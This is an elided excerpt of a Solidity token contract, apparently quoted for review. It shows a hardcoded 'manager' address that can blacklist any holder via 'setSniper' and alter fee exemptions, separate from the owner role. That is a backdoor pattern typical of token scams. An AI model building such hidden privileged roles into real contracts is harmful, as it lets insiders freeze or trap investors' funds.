...
contract Ownable is Context {
    ...
    address public _manager = 0x2eaEddaa6253EA6BD0B59e3Ee8e44961b8705AAA;
...
contract MLGoToken is Context, IERC20, Ownable {
    ...
    function EnableTrading(uint256 _deadblock, bool isEnabled) external onlyOwner {
    ...
    function setSniper(address account,bool isSniper) external onlyManager() {
            _blackList[account] = isSniper;
    ...
    function setIsExcludedFromFees(address account, bool newValue) public onlyManager {
        _isExcludedFromFees[account] = newValue;
    }

    function setMultiExcludedFromFees(address[] calldata accounts, bool newValue) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
